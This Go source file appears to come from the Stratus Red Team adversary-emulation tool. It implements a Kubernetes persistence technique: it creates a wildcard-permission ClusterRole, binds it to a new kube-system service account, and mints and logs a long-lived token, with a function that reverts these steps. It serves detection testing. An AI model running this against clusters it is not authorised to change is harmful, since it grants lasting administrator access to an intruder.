package kubernetes

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/smithy-go/ptr"
	authenticationv1 "k8s.io/api/authentication/v1"
	corev1 "k8s.io/api/core/v1"
	rbacv1 "k8s.io/api/rbac/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"log"

	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
)

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "k8s.persistence.create-admin-clusterrole",
		FriendlyName:       "Create Admin ClusterRole",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       false,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.PrivilegeEscalation},
		Description: `
Creates a Service Account bound to a cluster administrator role.

Warm-up: None

Detonation: 

- Create a Cluster Role with administrative permissions
- Create a Service Account (in the ` + namespace + ` namespace)
- Create a Cluster Role Binding
- Create a service account token, simulating an attacker stealing a service account token for the newly created admin role
`,
		Detonate: detonate,
		Revert:   revert,
	})
}

// Namespace to create the service account in
const namespace = "kube-system"

var all = []string{"*"}

var clusterRole = &rbacv1.ClusterRole{
	ObjectMeta: metav1.ObjectMeta{Name: "stratus-red-team-clusterrole"},
	Rules:      []rbacv1.PolicyRule{{Verbs: all, APIGroups: all, Resources: all}},
}

var serviceAccount = &corev1.ServiceAccount{
	ObjectMeta:                   metav1.ObjectMeta{Name: "stratus-red-team-serviceaccount"},
	AutomountServiceAccountToken: ptr.Bool(true),
}

var clusterRoleBinding = &rbacv1.ClusterRoleBinding{
	ObjectMeta: metav1.ObjectMeta{Name: "stratus-red-team-crb"},
	Subjects:   []rbacv1.Subject{{Kind: rbacv1.ServiceAccountKind, Name: serviceAccount.Name, Namespace: namespace}},
	RoleRef:    rbacv1.RoleRef{Kind: "ClusterRole", Name: clusterRole.Name},
}

func detonate(map[string]string) error {
	client := providers.K8s().GetClient()

	log.Println("Creating Cluster Role " + clusterRole.ObjectMeta.Name)
	_, err := client.RbacV1().ClusterRoles().Create(context.Background(), clusterRole, metav1.CreateOptions{})
	if err != nil {
		return errors.New("unable to create ClusterRole: " + err.Error())
	}

	log.Println("Creating Service Account " + serviceAccount.Name)
	_, err = client.CoreV1().ServiceAccounts(namespace).Create(context.Background(), serviceAccount, metav1.CreateOptions{})
	if err != nil {
		return errors.New("unable to create ServiceAccount: " + err.Error())
	}

	log.Println("Creating Cluster Role Binding to map the service account to the cluster role")
	_, err = client.RbacV1().ClusterRoleBindings().Create(context.Background(), clusterRoleBinding, metav1.CreateOptions{})
	if err != nil {
		return errors.New("unable to create ClusterRoleBinding: " + err.Error())
	}

	log.Println("Generating a service account token for this service account")
	tokenResponse, err := client.CoreV1().ServiceAccounts(namespace).CreateToken(
		context.Background(),
		serviceAccount.Name,
		&authenticationv1.TokenRequest{Spec: authenticationv1.TokenRequestSpec{ExpirationSeconds: ptr.Int64(3600 * 10)}},
		metav1.CreateOptions{},
	)
	if err != nil {
		return errors.New("unable to generate a service account token: " + err.Error())
	}

	log.Println("Successfully generate service account token: \n\n" + tokenResponse.Status.Token)
	return nil
}

func revert(map[string]string) error {
	client := providers.K8s().GetClient()
	roleName := clusterRole.Name
	deleteOpts := metav1.DeleteOptions{GracePeriodSeconds: ptr.Int64(0)}

	log.Println("Deleting ClusterRole " + roleName)
	err := client.RbacV1().ClusterRoles().Delete(context.Background(), roleName, deleteOpts)
	if err != nil {
		return errors.New("unable to remove ClusterRole " + err.Error())
	}

	err = client.CoreV1().ServiceAccounts(namespace).Delete(context.Background(), serviceAccount.Name, deleteOpts)
	if err != nil {
		return errors.New("unable to remove ServiceAccount " + err.Error())
	}

	err = client.RbacV1().ClusterRoleBindings().Delete(context.Background(), clusterRoleBinding.Name, deleteOpts)
	if err != nil {
		return errors.New("unable to remove ClusterRoleBinding: " + err.Error())
	}

	return nil
}
